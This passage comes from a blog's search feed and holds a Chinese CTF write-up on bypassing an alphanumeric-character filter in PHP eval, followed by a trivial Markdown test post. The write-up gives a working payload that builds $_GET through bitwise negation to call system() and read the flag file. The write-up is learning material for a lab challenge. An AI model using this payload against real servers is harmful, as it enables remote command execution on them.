    <content type="html"><![CDATA[<h1 id="rce2-无字母数字绕过"><a href="#rce2-无字母数字绕过" class="headerlink" title="rce2 (无字母数字绕过)"></a>rce2 (无字母数字绕过)</h1><p><img src="https://github.com/sawtooth384/image/raw/master/image.2i94qo6in3w0.webp" alt="image"></p><span id="more"></span><h2 id="相关基础知识的了解"><a href="#相关基础知识的了解" class="headerlink" title="相关基础知识的了解"></a>相关基础知识的了解</h2><p>preg_match( )函数：<a href="https://www.php.cn/php-weizijiaocheng-381228.html">php正则表达式中preg_match函数的详解-php教程-PHP中文网</a> </p><p>正则表达式：<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="题目内容理解"><a href="#题目内容理解" class="headerlink" title="题目内容理解"></a>题目内容理解</h2><p>题目中*preg_match()*过滤了<strong>a-z，0-9，A-Z</strong>字符，</p><p>而用*eval($code)*探索flag需要上述字符，</p><p>因此需要构造其他字符的变换(异或、或、取反等)以实现所需字符的变相输入。</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>字符位运算无需多说，</p><p>使用文章<a href="https://blog.csdn.net/miuzzx/article/details/109143413"> 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_yu22x的博客</a> 上的格式多次尝试，  </p><p>但是网页一片空白。</p><p>浏览别人的博客后，得知要使用<code>$&#123;_GET&#125;[a]($&#123;_GET&#125;[b]);&amp;a=***$b=***</code>格式  </p><p><img src="https://github.com/sawtooth384/image/raw/master/rce2ffff.3gwo54ngd420.webp" alt="rce2ffff"></p><p>于是<img src="https://github.com/sawtooth384/image/raw/master/image.6e7j92zb3sg0.webp" alt="image"> </p><p>payload：<code>?code=$&#123;~%a0%b8%ba%ab&#125;[%aa]($&#123;~%a0%b8%ba%ab&#125;[%bb]);&amp;%aa=system&amp;%bb=cd%20/;cat ffffllllaaaagggg</code></p><h1 id="easy-ssit"><a href="#easy-ssit" class="headerlink" title="easy_ssit"></a>easy_ssit</h1><p><img src="https://github.com/sawtooth384/image/raw/master/image.24no0lg8giow.webp" alt="image">  </p><p><a href="https://www.freebuf.com/articles/web/279670.html">从0到1:Flask SSTI(服务器模板注入)</a>  </p><h2 id="题目内容理解-1"><a href="#题目内容理解-1" class="headerlink" title="题目内容理解"></a>题目内容理解</h2>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第一周</tag>
      
      <tag>寒假</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>my-first-blog</title>
    <link href="/2023/01/15/my-first-blog/"/>
    <url>/2023/01/15/my-first-blog/</url>
    
    <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><hr><span id="more"></span><h2 id="Markdown体验还不错"><a href="#Markdown体验还不错" class="headerlink" title="Markdown体验还不错"></a>Markdown体验还不错</h2><hr><p>但是感觉下划线不是很明显啊。  </p><h1 id="新的尝试"><a href="#新的尝试" class="headerlink" title="新的尝试"></a>新的尝试</h1><p><strong>粗体</strong>与<em>斜体</em>  </p><h1 id="标题加粗会怎样"><a href="#标题加粗会怎样" class="headerlink" title="标题加粗会怎样"></a><strong>标题加粗会怎样</strong></h1><h2 id="不会怎样"><a href="#不会怎样" class="headerlink" title="不会怎样"></a>不会怎样</h2><hr><h1 id="神奇的引用"><a href="#神奇的引用" class="headerlink" title="神奇的引用"></a>神奇的引用</h1><blockquote><p>神奇的引用  </p><blockquote><p>神奇的引用</p><p><em>神奇的引用</em></p><ul><li>神奇的引用</li></ul></blockquote></blockquote><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><hr><p><img src="https://github.com/sawtooth384/image/raw/master/badgirl.5nlodbxdey80.webp" alt="badgirl"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p><code>安徽</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>初体验</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
